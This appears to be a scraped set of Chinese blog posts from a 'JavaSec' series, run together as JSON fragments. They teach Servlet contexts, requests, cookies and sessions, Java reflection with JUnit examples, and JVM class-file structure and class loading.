ServletContext对象是一个域对象（域对象的作用:保存数据,获取数据,共享数据）； ServletContext在web工程部署启动的时候创建，在web工程停止的时候销毁。 ServletContext的作用 获取 web.xml 配置文件中的 context-param 参数的值 context.getInitParameter(String s) context-param的值保存在 ServletContext 对象中，一个项目下的所有Servlet都可以获取到 以context（上下文）结尾的类或者接口大多都承担存储整一个工程中的一些通用信息的职责 获取当前的工程路径：/路径 context.getContextPath() http(s)//ip:port/[工程路径] 获取工程部署在服务器硬盘上的绝对路径 context.getRealPath(\u0026quot;/\u0026quot;) 以IDEA举例，工程在部署之后，IDEA会将一个Module模块下的 webapp 目录下的文件以及编译成 .class 的字节码拷贝到一个对应的硬盘位置 /表示webapp目录对应的工程部署之后的存储目录 也可以添加其他webapp目录下的其他资源或者目录的路径 存取数据（向Map一样） void setAttribute(String var1, Object var2); Object getAttribute(String var1); @Override public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { super.service(req, res); // 获取 context-para参数的值 ServletContext context = getServletContext(); System.out.println(\u0026#34;Get context parameters, username: \u0026#34; + context.getInitParameter(\u0026#34;username\u0026#34;)); System.out.println(\u0026#34;Get context parameters, username: \u0026#34; + context.getInitParameter(\u0026#34;password\u0026#34;)); // 获取当前的工程路径 System.out.println(\u0026#34;Get project path: \u0026#34; + context.getContextPath()); // 获取工程部署在服务器硬盘上的绝对路径 System.out.println(\u0026#34;Get project real path on server\u0026#39;s disk: \u0026#34; + context.getRealPath(\u0026#34;/\u0026#34;)); } 存取数据 @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { ServletContext context = getServletContext(); context.setAttribute(\u0026#34;key_str\u0026#34;, \u0026#34;A\u0026#34;); context.setAttribute(\u0026#34;key_int\u0026#34;, 2); System.out.println(\u0026#34;获取Context中的存储的值, key_str: \u0026#34; + context.getAttribute(\u0026#34;key_str\u0026#34;)); System.out.println(\u0026#34;获取Context中的存储的值, key_int: \u0026#34; + context.getAttribute(\u0026#34;key_int\u0026#34;)); } HttpServletRequest 接下来我们会来具体地看看Servlet是如何处理来自客户端的请求的。 @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {} @Override protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {} 首先还是回到doGet以及doPost请求，我们看到他们都有共同的参数 HttpServletRequest以及HttpServletResponse HttpServletRequest的作用 每当Tomcat服务器收到来自客户端的请求时，服务器都会将用户的HTTP请求封装到 Request的对象中并传递到service方法中供程序员进行处理，我们可以通过该HttpServletRequest对象获取所有请求的信息 HttpServletRequest API Method Description｜ getRequestURI() 获取请求的资源路径 getRequestURL() 获取请求的统一资源定位符（绝对路径） getRemoteHost() 获取客户端的ip地址 getHeader() 获取请求头 getParameter 获取请求的参数 getParameterValues 获取请求的参数（多个值的时候使用） getMethod() 获取请求的方式（GET/POST） setAttribute(key， value) 设置域数据 getAttribute(key) 获取域数据 getRequestDispatcher() 获取请求转发对象 setCharacterEncoding() 设置字符集（防止出现POST请求的中文乱码问题） 注意：设置字符集需要在获取请求参数之前设置才有效 请求转发 当我们需要创建多个Servlet完成复杂的业务操作时，就要使用请求的转发。 首先我们要明确对于每次客户端的请求都只维护唯一个HttpServletRequest对象，这个request对象将在业务流水线上的所有Servlet之间传递。 每个Servlet首先完成自己的业务逻辑，然后需要使用 getRequestDispatcher(str) 获取调度器，进而使用RequestDispatcher forward(request, response)来完成转发 值得注意的是，使用的调度器只能在工程目录下寻找（因为是斜杠打头），并且由于WEB-INF是受保护的目录，因此用户在客户端无法直接访问WEB-INF下的资源 getRequestDispatcher(str) 获取调度器，请求转发到另一个资源（以斜杠打头） / 斜杠表示地址为：http://ip:port/%E5%B7%A5%E7%A8%8B%E5%90%8D, 部署后所映射到的web目录 RequestDispatcher forward(request, response) 转发请求 值得注意的是，使用的调度器只能在工程目录下寻找（因为是斜杠打头），并且由于WEB-INF是受保护的目录，因此用户在客户端无法直接访问WEB-INF下的资源 第二点需要关注的是，在使用请求转发以及其他情况下发生了地址栏URL的变化的时候，可能会导致一些相对路径的地址发生跳转错误，这时候可以使用\u0026lt;base href\u0026gt;标签来将一个页面的相对路径固定，从而避免错误 HttpServletResponse 对于每一个用户的HTTP请求，Tomcat服务器都会创建唯一一个Response对象在Servlet之间传递，用于表示所有的响应信息。 两个输出流 那么当Tomcat服务器收到并处理了用户的请求之后，就需要做出响应，通常都需要返回给用户资源，那么根据返回资源类型的不同，Java Web提供了两种输出流 get Method Description getOutputStream() 回传二进制数据 getWriter() 回传字符串数据 只能获取一个输出流，因此这两个方法不能同时使用，否则会出现报错（服务器错误，500） 如何往客户端回传数据 那么得到了返回流对象之后，还需要使用回传的具体方法来进行输出 write() printWriter() 结语 通过对于Servlet的学习，我们知道了Servlet是作为Java web中是web服务端用来处理客户端的各种请求的一个中间件，我们一直都说要重视用户的输入，因此其的安全至关重要。 Servelet中各个组件的关系如下图所示： Figure 4: Servlet Summary\n我们也开始了解了一些Java web开发中的一些组成结构，也体验了一下实际开发中的一些流程与操作，更加具体的使用这里暂时就不具体展开了。 补充内容 Cookie Cookie是服务器通知客户端保存键值对的一种技术 客户端有了Cookie之后，每次请求都发送给服务器 每个cookie的大小不能超过4KB Figure 5: Cookie的创建\n服务器获取Cookie\n返回数组进行遍历之后才能获取具体的Cookie的值 修改Cookie\n构造新的Cookie对象来覆盖原有Cookie 查找需要修改的的Cookie对象，并用setValue方法赋予Cookie新的值（注意有一定的格式要求），最后调用response.addCookie()通知客户端保存修改的Cookie Cookie的生命控制\nCookie的生命控制指的是如何管理Cookie什么时候被销毁（删除） 由SetMaxAge()方法来控制 public void setMaxAge(int expiry) Sets the maximum age in seconds for this Cookie. A positive value indicates that the cookie will expire after that many seconds have passed. Note that the value is the maximum age when the cookie will expire, not the cookie\u0026rsquo;s current age. A negative value means that the cookie is not stored persistently and will be deleted when the Web browser exits. A zero value causes the cookie to be deleted. 马上删除 Cookie有效路径path的设置\n使用path属性可以有效地过滤哪些Cookie可以发送给服务器，哪些不发 对于单次的请求来说，只有path满足当前请求地址的cookie，才会被一起发送 Cookie免密登陆\nFigure 7: Cookie免密登陆\nSession Session在Java中是一个接口，是一个会话，用来维护 一个客户端 和服务器之间的关联技术。 Session会话中，我们经常用来保存用户登陆之后的信息（在服务端） 创建和获取Session\nrequest.getSession() 第一调用时创建Session会话，之后再调用，都会获取前面创建好的Session会话对象。 isNew():判断到底是不是刚创建出来的 每个会话都有一个ID值来唯一标识一个Session getId() 来获取ID Session域的数据存取\n我们知道Session是保存在服务器端保存的用户登陆之后的信息 既然是域对象，那么API与之间我们见过的也是一致的 setAttribute(key, value) getAttribute(key) Session生命周期控制\nvoid setMaxInactiveInterval(int interval) Specifies the time, in seconds, between client requests before the servlet container will invalidate this session. An interval value of zero or less indicates that the session should never timeout. Parameters: interval - An integer specifying the number of seconds int getMaxInactiveInterval() Returns the maximum time interval, in seconds, that the servlet container will keep this session open between client accesses. After this interval, the servlet container will invalidate the session. The maximum time interval can be set with the setMaxInactiveInterval method. A return value of zero or less indicates that the session will never timeout. Returns: an integer specifying the number of seconds this session remains open between client requests See Also: setMaxInactiveInterval(int) Session的超时的概念指的是，客户端两次请求之间的间隔（Interval），如果超出规定的时间，Session就会失效 Session的默认的超时时间为30min，可以在web.xml中查看到该配置，如果需要修改统一的默认时间，也可以重写这个配置来定义 \u0026lt;session-config\u0026gt; \u0026lt;session-timeout\u0026gt;30\u0026lt;/session-timeout\u0026gt; \u0026lt;/session-config\u0026gt; Cookie \u0026amp; Session总结 Figure 8: Cookie \u0026amp; Session总结\n客户端发起请求，服务器接收到请求之后创建新的Session（request.getSession()），并存放到内存中 服务器在为该客户端创建Session时，还会创建一个Cookie对象来保存JSESSIONID:ID的键值对，并发送给客户端 客户端收到Set-Cookie请求头之后，保存SessionID，并在之后的每一次请求中都带上这个Cookie 服务器在每次收到客户端的请求时也会收到SessionID，从而在内存中寻找对应的Session 由于Cookie的默认存活时间设置为Session，即关闭浏览器直接销毁，因此当保存有SessionID的Cookie被销毁之后，原本的Session也就自然而然的失效了。 Reference 【尚硅谷最新版JavaWeb全套教程,java web零基础入门完整版】 ","date":"2022-09-13T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javaweb_servlet/","title":"JavaSec - Java Web - 三大核心组件 - Servlet"},{"content":"JavaSec - Java基础 - 反射（Reflection） 什么是反射？为什么要用使用反射？ \u0026ldquo;Reflection enables Java code to discover information about the fields, methods and constructors of loaded classes, and to use reflected fields, methods, and constructors to operate on their underlying counterparts, within security restrictions. The API accommodates applications that need access to either the public members of a target object (based on its runtime class) or the members declared by a given class. It also allows programs to suppress default reflective access control.\u0026rdquo; \u0026ndash; Java Reflection API 根据Oracle的官方文档，我们可以知道反射Reflection的作用就是，在Java程序运行的过程中可以获取 加载的class对象 的相关信息，包括成员变量，方法以及构造器，同时可以利用反射来创建对象并且调用其属性（成员变量，构造器，方法）。 这听起来和new一个类的对象，然后操作其属性很像对吗，那么区别在哪里呢？我们为什么不直接new对象却需要来使用反射呢？ 不要着急，我认为既然确定了反射是需要学习的目标，不妨我们先来学习一下反射是如何使用的，有了一定的了解之后，相信也会更为方便的去理解使用反射的优势与原因。 反射的原理 这一节中我们先来理解一下反射背后的原理，方便我们接下来学习具体的代码应用。 我们先来回顾一下程序员编写的Java代码在计算机中，从编写到被执行所经历的三个阶段： Source源码阶段 : - Java代码的最开始就是程序员在IDE中所编写的 .java 文件中的源代码 进而通过 javac 编译之后成为 .class 文件 这两种文件都存储于计算机的硬盘之中 Class对象阶段 : - 接着使用 java 命令来执行 .class 文件，这里就启动了一个 JVM进程 JVM通过类加载器以双亲委派模型的方式来找到并加载 .class文件（或者其他字节码文件） 最终的结果是将一个 Class 类的对象存储在内存中 这个 Class 类对象包含三个重要属性 成员变量 成员方法 构造方法 这三种属性都会以数组对象的形式存储 内存 : 创建已经加载的类的对象，并存储与内存中（如果没有加载，则在第二步中进行加载） Figure 1: Java代码在计算机中的各个阶段\n现在我们知道了一个类在加载之后会创建一个 Class 类的对象，其中会包含所有其属性的信息，并被保存在内存中，而反射Reflection就是利用这些 Class 类对象，来获取其中属性的信息。还是那句话，这里肯定有很多为什么要问，但是我还是建议先继续看具体的代码使用，或者可以直接看后面为什么要使用反射的原因以及使用的场景那一节，如果觉得不好理解再回头看看具体的使用。 反射的使用 获取Class对象 获取Class对象的有三种方式 Object.getClass(), 获得对象之后调用顶层父类 Object 的方法 getClass() 所有数据类型（包括基本的数据类型）都有一个 静态 的class属性 Class类的静态方法 forName(String className) 方法（最常用） package ReflectionLearn; import org.junit.jupiter.api.Test; public class ReflectionTest { @Test public void reflectClass() throws Exception{ // 第一种获取Class对象的方式 ReflectedObject ro = new ReflectedObject(); Class roClass1 = ro.getClass(); System.out.println(roClass1.getName()); // 第二种获取Class对象的方式 Class roClass2 = ReflectedObject.class; System.out.println(\u0026#34;Two class object are same: \u0026#34; + (roClass1 == roClass2)); // 第三种获取Class对象的方式 try { Class roClass3 = Class.forName(\u0026#34;ReflectionLearn.ReflectedObject\u0026#34;); System.out.println(\u0026#34;Two class object are same: \u0026#34; + (roClass3 == roClass2)); } catch (ClassNotFoundException e){ e.printStackTrace(); } } } 判断是否为某个类的实例对象 我们使用Class对象中的成员方法 isInstance() 方法来判断输入的对象是否为Class对象所代表的类的一个实例。 public native boolean isInstance(Object obj); 这是一个native方法，意味着其方法的实现源码不是java。 @Test public void ifInstanceTest() throws Exception { ReflectedObject ro = new ReflectedObject(); Class roClass = ro.getClass(); System.out.println(roClass.isInstance(ro)); System.out.println(ro instanceof ReflectedObject); } 获取实例对象 获取实例对象有两种方法： 调用Class对象的 newInstance 方法来创建Class对象对应的实例对象 先通过Class对象指定想要使用的一种Constructor构造器的对象，然后调用Constructor对象的newInstance()方法来创建对象 @Test public void reflectObject() throws Exception { Class roClass = Class.forName(\u0026#34;ReflectionLearn.ReflectedObject\u0026#34;); Object reflectedObject1 = roClass.newInstance(); // 获取指定的Class对象的一种构造器的对象 Constructor constructor = roClass.getConstructor(null); Object reflectedObject2 = constructor.newInstance(); } 获取构造器 批量获取构造器 public Constructor\u0026lt;?\u0026gt;[] getConstructors()，获取所有 public 构造器 public Constructor\u0026lt;?\u0026gt;[] getDeclaredConstructors()，获取所有的构造器（public, private, protected, default） 获取单个构造器 public Constructor\u0026lt;T\u0026gt; getConstructor(Class\u0026lt;?\u0026gt;\u0026hellip; parameterTypes)，获取单个 public 构造器 public Constructor\u0026lt;T\u0026gt; getDeclaredConstructor(Class\u0026lt;?\u0026gt;\u0026hellip; parameterTypes)，获取任意的单个构造器 调用构造器 Constructor\u0026ndash;\u0026gt;public T newInstance(Object \u0026hellip; initargs) 无参构造器使用null作为参数 使用范例 public ReflectedObject(){ System.out.println(\u0026#34;public 无参构造器\u0026#34;); } // 单参构造器 public ReflectedObject(String field){ System.out.println(\u0026#34;public 单参构造器：\u0026#34; + field); } // 多参构造器 public ReflectedObject(String field, int num) { System.out.println(\u0026#34;public 多参构造器：\u0026#34; + field + \u0026#34;;\u0026#34; + num); } // protected 构造器 protected ReflectedObject(boolean b) { System.out.println(\u0026#34;protected 单参构造器 b =\u0026#34; + b); } // private 构造器 private ReflectedObject(int i) { System.out.println(\u0026#34;private 单参构造器 i = \u0026#34; + i); } // default 构造器 ReflectedObject(char c){ System.out.println(\u0026#34;default 单参构造器 c = \u0026#34; + c); } 测试实例 @Test public void reflectConstructor() throws Exception { Class roClass = Class.forName(\u0026#34;ReflectionLearn.ReflectedObject\u0026#34;); // getConstructors() System.out.println(\u0026#34;getConstructors():\u0026#34;); Constructor[] constructors = roClass.getConstructors(); for (Constructor c : constructors) { System.out.println(c); } System.out.println(); // getDeclaredConstructors() System.out.println(\u0026#34;getDeclaredConstructors():\u0026#34;); Constructor[] declaredConstructors = roClass.getDeclaredConstructors(); for (Constructor c : declaredConstructors) { System.out.println(c); } // 获取公有的无参构造器 System.out.println(\u0026#34;reflect public non-parameter constructor\u0026#34;); Constructor con = roClass.getConstructor(null); System.out.println(\u0026#34;con = \u0026#34; + con); // 调用构造器 Object obj = con.newInstance(); // 获取私有构造器并调用 System.out.println(\u0026#34;reflect and call private constructor\u0026#34;); con = roClass.getDeclaredConstructor(int.class); System.out.println(con); // 暴力反射，忽略访问修饰符 con.setAccessible(true); obj = con.newInstance(2); } 获取成员变量 批量获取成员变量 Field[] getFields(), public成员变量 Field[] getDeclaredFields(), 获取所有成员变量（pubic, protected, private, default） 获取单个成员变量 public Field getField(String fieldName), 获取单个public成员变量 public Field getDeclaredField(String fieldName), 获取任意成员变量 设置成员变量的值 Field \u0026ndash;\u0026gt; public void set(Object obj, Object value) obj, 设置成员变量所在的对象； value, 设置的值 实例 // fields public String str; protected int i; char c; private Date d; 测试实例 @Test public void reflectedFields() throws Exception { Class roClass = Class.forName(\u0026#34;ReflectionLearn.ReflectedObject\u0026#34;); // getFields() System.out.println(\u0026#34;getFields():\u0026#34;); Field[] fields = roClass.getFields(); for(Field f : fields){ System.out.println(f); } // getDeclaredFields() System.out.println(\u0026#34;\\ngetDeclaredFields():\u0026#34;); fields = roClass.getDeclaredFields(); for(Field f : fields){ System.out.println(f); } // 获取public成员变量 System.out.println(\u0026#34;\\npublic field\u0026#34;); Field f = roClass.getField(\u0026#34;str\u0026#34;); // 设置public成员变量的值 System.out.println(\u0026#34;\\nset public field\u0026#39;s value\u0026#34;); Object obj = roClass.getConstructor().newInstance(); f.set(obj, \u0026#34;A new string\u0026#34;); System.out.println(\u0026#34;public fields is set to :\u0026#34; + ((ReflectedObject)obj).str); // 获取private成员变量 System.out.println(\u0026#34;\\nprivate field\u0026#34;); f = roClass.getDeclaredField(\u0026#34;d\u0026#34;); // 设置private成员变量的值 f.setAccessible(true); // 暴力反射，解除私有限定 f.set(obj, new Date()); System.out.println(\u0026#34;private field is set to :\u0026#34; + (ReflectedObject)obj); } 获取成员方法 批量获取成员方法 Field[] getMethods(), public成员方法 Field[] getDeclaredMethods(), 获取所有成员方法（pubic, protected, private, default） 获取单个成员方法 public Method getMethod(String name, Class\u0026lt;?\u0026gt;\u0026hellip; parameterTypes), 获取单个public成员方法 public Method getDeclaredMethod(String name, Class\u0026lt;?\u0026gt;\u0026hellip; parameterTypes), 获取任意成员方法 设置成员变量的值 Method \u0026ndash;\u0026gt; public Object invoke(Object obj, Object\u0026hellip; args) obj, 设置成员变量所在的对象（staic方法使用null）； args, 调用方法时所传递的参数 实例： // methods // public 成员方法 public void publicMethod(String str){ System.out.println(\u0026#34;public 成员方法，设置str = \u0026#34; + str); } // protected 成员方法 protected void protectedMethod(){ System.out.println(\u0026#34;protected 成员方法\u0026#34;); } // default 成员方法 void defaultMethod(){ System.out.println(\u0026#34;default 成员方法\u0026#34;); } // private 成员方法 private String privateMethod(int i) { System.out.println(\u0026#34;private 成员方法，设置 i = \u0026#34; + i); return \u0026#34;returnValue\u0026#34;; } // main 方法 public static void main(String[] args) { System.out.println(\u0026#34;main方法\u0026#34;); } 测试实例 @Test public void reflectedMethods() throws Exception { Class roClass = Class.forName(\u0026#34;ReflectionLearn.ReflectedObject\u0026#34;); // getMethods() System.out.println(\u0026#34;getMethods()\u0026#34;); Method[] methods = roClass.getMethods(); for (Method m : methods) { System.out.println(m); } // getDeclaredMethods() System.out.println(\u0026#34;\\ngetDeclaredMethods()\u0026#34;); methods = roClass.getDeclaredMethods(); for (Method m : methods) { System.out.println(m); } // getMethod() System.out.println(\u0026#34;\\ngetMethod()\u0026#34;); Method m = roClass.getMethod(\u0026#34;publicMethod\u0026#34;, String.class); Object obj = roClass.getConstructor().newInstance(); m.invoke(obj, \u0026#34;string value\u0026#34;); // getDeclaredMethod() System.out.println(\u0026#34;\\ngetDeclaredMethod\u0026#34;); m = roClass.getDeclaredMethod(\u0026#34;privateMethod\u0026#34;, int.class); m.setAccessible(true); // 暴力反射，解除私有限定 m.invoke(obj, 2); // get and invoke main method /* main方法为static静态方法，因此在调用时可以使用null作为对象 * invoke的第二个参数的要求为一个String数组，但是这里我们提供的是一个 Object[] * 这是因为在jdk1.4时要求为数组，就算在jdk1.5修改为可变参数之后，也要考虑向下兼容的问题 * 单同时直接使用 new String[]{\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;}会被jdk1.5之后的版本拆成三个对象，因此需要需要强制转换成Object[] */ System.out.println(\u0026#34;\\nget and invoke main method\u0026#34;); m = roClass.getMethod(\u0026#34;main\u0026#34;, String[].class); m.invoke(null, (Object) new String[]{\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;}); } 反射的其他使用 通过反射运行配置文件的内容\nclassName = ReflectionLearn.ReflectedObject methodName = publicMethod 测试实例 public static String getConfig(String key) throws IOException { Properties properties = new Properties(); FileReader in = new FileReader(\u0026#34;/Users/runfeng/IdeaProjects/JavaSec/src/ReflectionLearn/config.txt\u0026#34;); properties.load(in); in.close(); return properties.getProperty(key); } @Test public void loadConfig() throws Exception { Class roClass = Class.forName(getConfig(\u0026#34;className\u0026#34;)); Method m = roClass.getMethod(getConfig(\u0026#34;methodName\u0026#34;), String.class); m.invoke(roClass.getConstructor().newInstance(), \u0026#34;String value\u0026#34;); } 使用配置文件的好处就在于，如果我们需要升级整个系统，不需要旧的类的时候，就可以重新写一个新的类，并且修改配置文件中的内容即可，而不需要修改源代码中的名称 通过反射越过泛型检查\n我们可以通过反射来绕过泛型检查，从而向String类型的集合中添加一个Integer类型的值 @Test public void bypassGeneric() throws Exception { ArrayList\u0026lt;String\u0026gt; strList = new ArrayList\u0026lt;\u0026gt;(); strList.add(\u0026#34;a\u0026#34;); strList.add(\u0026#34;b\u0026#34;); Class listClass = strList.getClass(); Method m = listClass.getMethod(\u0026#34;add\u0026#34;, Object.class); m.invoke(strList, 100); for(Object obj : strList){ System.out.println(obj); } } 为什么要使用反射的三大原因 本小结旨在回答一个问题，为什么不使用new来创建对象，进而调用和操作一个对象的属性？ 不得已而为之 当我们没办法使用new来实例化对象的时候，就只能使用反射来操作对象 当调用来自网络的 .class 文件时，因为没有 .java 代码，因此无法通过new来进行实例化对象 注解 (Annotation) - 注解本身仅仅是起到标记作用，它需要利用反射机制，根据注解标记去调用注解解释器，执行行为。如果没有反射机制，注解并不比注释更有用。 动态加载 通过反射的方式加载类，可以减少JVM启动时的工作，进而减少JVM的启动时间，同时可以动态地加载所需要的对象（多态） 提高协作效率，例如两个程序员共同开发的时候，不要等待别人写好.java源文件，而只需要使用反射即可实现对象的实例化以及操作 增加代码的灵活度，避免将代码写死 我们之前提到了使用配置文件的形式来选择加载的类以及操作对象中的属性就体现了这种好处。 通过使用配置文件，我们可以讲代码解耦，减少修改源码，进而减少重新编译的情况 许多通用的开发框架就用到了这样的思想 反射的缺点 性能开销 由于反射涉及动态解析的类型，因此无法执行某些 Java 虚拟机优化。因此，反射操作的性能要比非反射操作的性能要差，应该在性能敏感的应用程序中频繁调用的代码段中避免。 破坏封装性 反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。 内部曝光 由于反射允许代码执行在非反射代码中非法的操作，例如访问私有字段和方法，所以反射的使用可能会导致意想不到的副作用，这可能会导致代码功能失常并可能破坏可移植性。反射代码打破了抽象，因此可能会随着平台的升级而改变行为。 Reference Java Reflection API Java基础篇：反射机制详解 Java反射：用最直接的大白话来聊一聊Java中的反射机制 为什么需要Java反射？ java为何用反射，举例说明 java 反射机制，为什么要用反射？ ","date":"2022-09-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javabasic_reflection/","title":"JavaSec - Java基础 - 反射（Reflection）"},{"content":"JavaSec - Java 基础 - JVM与类的加载 本篇主要记录一些在正式开始Java安全学习之前的一些基础知识的学习，说是基础，其实更多的是一些Java的底层概念的理解以及学习文章的分享，至于语法部分，请参考各种教程网站会更为高效 了解JVM (Java Virtual Machine) 参考：深入理解Java虚拟机到底是什么 相信大家都是使用一款顺手的IDE来写Java，在配合五花八门的插件写完代码之后，点击运行来观察效果。但是大家是否了解计算机到底是如何来执行Java代码的呢？ 我们先拿C语言来进行对比举例，我们写完C语言代码之后，进行编译，然后就可以生成可执行文件，接着执行可执行文件，就相当于创建一个进程，并将可执行文件加载到进程的地址空间中，从而执行指令。 那么Java又是怎样呢？ 我们以最基本的HelloWorld来举例： 我们首先创建一个HelloWorld.java文件，来写入下列Java代码： public class HelloWorld { public static void main(String[] args) { System.out.println(\u0026#34;Hello world!\u0026#34;); } } 和C语言源文件一样，HelloWorld.java并不能被直接执行，而是需要进行编译 javac HelloWorld.java 从而得到HelloWorld.class文件，这时候就可以使用Java命令来执行了 java HelloWorld 看上去和C语言的流程是一样的，但是区别在于，C语言最后编译得到的是可以直接由计算机开启进程来运行的可执行文件，而Java的class文件是无法被直接执行的，这时候就需要请JVM (Java Virtual Machine)登场了。 我们先简单地给出一个定义，到底什么是一个Java虚拟机？Java虚拟机和我们平时用到的虚拟机是一样，都是通过仿真实际计算机上的各种硬件的功能来实现的，例如处理器、堆栈、寄存器以及对应的指令系统，同时JVM会屏蔽与操作系统平台相关的信息，以此来实现跨平台使用。JVM实现的指令系统就是字节码，即.class文件。 这时候我们回顾刚才举的例子，最后是使用 java 命令来执行 .class文件，这里实际的效果就是 启动了一个JVM进程 ，然后由JVM来加载 .class文件（字节码）来进行翻译成CPU能够识别的指令来交给CPU执行。 Figure 1: Java编译运行\n接下来我们就开始介绍，JVM具体是如何处理 .class 文件 类文件结构 在正式分析类的加载机制之前，我想先来总结一下关于 类（class） 这个文件结构的相关知识，本人在学习的过程中，也有很多的收获。读者也可以自行跳过本章，直接阅读JVM的类加载机制。 首先我们来介绍JVM的两大特性： 平台无关性 与 语言无关性 。 平台无关性 体现在JVM可以在任何硬件体系结构或者操作系统上运行，其也是响应Java诞生之出那个响亮的口号““一次编写，到处运行 （Write Once，Run Anywhere）”，随着虚拟机以及大量建立在虚拟机上的语言的蓬勃发展，越来越多的程序语言通过使用特殊的存储格式来存储编译的程序，来摆脱操作系统和指令集的限制，后面我们会具体说到，JVM使用的就是 class 这个特殊的字节码结构； 语言无关性 就更加反常识了，JVM不仅能运行Java程序，其他语言例如Kotlin、Clojure、Groovy、JRuby、JPython、Scala都可以在JVM上运行，它们都有一个共同的特点，可以被编译器转化为 \u0026quot;Class文件\u0026quot; 。因此，我们可以说JVM完全不关心不限制原本的编程语言是什么，其核心就是 \u0026quot;Class\u0026quot; 这种字节码存储格式，以及JVM所能提供的字节码指令。 Figure 2: JVM的语言无关性\nClass类文件的结构 接下来我们具体来看一下Class类文件的结构，首先我们需要知道的是：任何一个Class文件都对应着唯一的一个类或接口的定义信息（即使是私有类也不例外），我们可以看一个例子 public class HelloWorld { private class TestPrivate{ public TestPrivate() { } } public static void main(String[] args) { System.out.println(\u0026#34;Hello world!\u0026#34;); } } 我们还是使用 javac 来对上main的java文件进行编译，生成的class文件就有两个： HelloWorld$TestPrivate.class HelloWorld.class Class文件是一组以 8个字节 为基础单位的二进制流，所有的数据都紧密的排列，没有任何分隔符，如果需要存储8个字节以上的数据项时，使用大端对齐（高位在前）的方式进行存储。 Class文件中采用一种类似于C语言结构题的伪结构来存储所有的数据，其中包含两种数据类型： 无符号数 最基本的数据类型，通过u1, u2, u4, u8来表示1, 2, 4, 8个字节的无符号数，可以用来表示数字、索引引用、数量值或者按照UTF-8编码构成字符串 值。 表 表示多个无符号数或者与表组成的复合数据类型，表的命名总是习惯以 \u0026quot;_info\u0026quot; 结尾，具体的例子我们都会在后面看到 因此我们也可以说整一个Class文件本质上就是一张 \u0026quot;表\u0026quot;,存储了复合的数据结构 Figure 3: Class文件格式\n我们观察上图可以发现，整一个Class文件就是由多个无符号数以及表组成的一张表，同时，在以 \u0026quot;_info\u0026quot; 结尾的表的数据项之前，都有一个以 \u0026quot;_count\u0026quot; 结尾来命名的无符号数来表示表的大小。 魔数（Magic Number）与Class文件的版本 魔数，Magic Number这个词我们乍一看很别扭，但是如果练习过文件上传漏洞的师傅们肯定已经接触过了，它就是一个文件的文件头，例如GIF或者JPEG都有其专属的文件头，在文件上传中我们可以修改文件头来进行绕过。 每个Class文件的头4个字节被称为魔数（Magic Number），以此来判断一个Class文件是否能够被虚拟机所接受。 Class文件的魔数就是 0xCAFEBABE 象征着著名咖啡品牌Peet’s Coffee深受欢迎的Baristas咖啡。 紧接着的4个字节存储的是Class文件的版本号：第5和第6个字节（前四个为魔数）是次版本号（Minor Version），第7和第8个字节是主版本号（Major Version）。 Figure 4: Class魔数\nFigure 5: Class文件的魔数十六进制实例\n我们可以使用之前的HelloWorld.class的实例来查看这个结构，可以看到4个字节的魔数为 0xcafebabe, 而主版本号为0x0034，也就是52，根据下面的对应表可以得知使用的JDK 8 Figure 6: Class文件JDK版本对应表\n我们之前提到过，Class类文件的排列非常紧凑，没有分隔符，紧接着主、次版本号之后存储的依次就是常量池、访问标志、类索引、父类索引与接口索引集合、字段表集合、方法表集合和属性表集合，这些内容我们在这里就不做展开介绍了，有兴趣的师傅可以读一读《深入理解Java虚拟机：JVM高级特性与最佳实践》的6.3节。 类加载的触发时机 在我们正式开始讲JVM的类加载机制之前，我们先来搞清楚什么时候会触发类加载机制。 总的来说，类加载的原则是：延迟加载，即能不加载就不加载；同样的类加载的时机就是，第一次需要使用这个类的信息时，常见的情况有： 访问调用静态成员 访问类的静态方法（除了有final修饰时） public static final int a =123;为常量，不需要加载 public static final int a = math.PI; 编译时不确定常量的时，会加载 访问类的静态变量 第一次new对象的时候 创建顶层父类的实例 创建子类的实例时，优先加载其父类 一个类被加载时，如果类中的静态代码块、静态方法或静态变量饮用到了另一个类，则这个类也会被加载 JVM启动时，定义了main的类，启动main方法时该类会被加载 反射 虚拟机类加载机制 之前我们简单介绍了一些Class文件的结构以及触发类加载机制的时机，那么接下来我们要介绍的就是JVM具体是如何加载和使用这些Class文件。之前我们提到过，每一个类或者接口都需要一个单独的Class文件，从他们被加载到虚拟机内存中开始，到卸载出内存为止，一共要经历七个阶段，分别是：加载 （Loading）、验证（Verification）、准备（Preparation）、解析（Resolution）、初始化 （Initialization）、使用（Using）和卸载（Unloading）七个阶段，其中验证、准备、解析三个部分统称 为连接（Linking）。 Figure 7: Class文件加载的生命周期\n这里有两点要注意的是： 每一个阶段并不是等上一个阶段完成之后才开始的，而是在一个阶段的执行过程中就会调用另一个阶段，从而互相交叉混合进行的 同时，解析这个阶段的调用时间并不固定，其可以如何所示在准备（Preparation）时被调用，也可以等待初始化（Initilization）之后再开始 接下来我们将简单介绍一下每个阶段都发生了什么，主要参考《深入理解Java虚拟机：JVM高级特性与最佳实践》的7.3节，感兴趣的读者可以直接去阅读书本获取更多详细信息，也可以跳过本节，直接阅读关于 ClassLoader 类加载器的内容。 加载（Loading） 通过一个类的全限定名（唯一类名）来获取定义此类的二进制字节流。 并不一定是一个Class文件，可以是从ZIP中读取（JAR、EAR、WAR），从网络中获取，Web Applet，从数据库中等等 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口。 验证（Veritification） 作为连接（Linking）的第一步，这一阶段的目的是确保Class文件的字节流中包含的信息符合《Java虚 拟机规范》的全部约束要求，保证这些信息被当作代码运行后不会危害虚拟机自身的安全。 我们知道Java相较于C/C++来说是相对安全的，纯粹的Java无法做到一些危险的行为（例如访问数组边界以外的数据），但是我们之前提到过，Class文件是一个字节流，可以由其他的语言编译而来，同时字节流指令的功能是比Java多的，因此验证阶段主要是保证字节码的安全性，是必要的措施。 验证阶段大致可以分为四个阶段的检验动作： 文件格式验证（例如：是否以魔数0xCAFEBABE开头，主、次版本号是否在当前Java虚拟机接受范围之内） 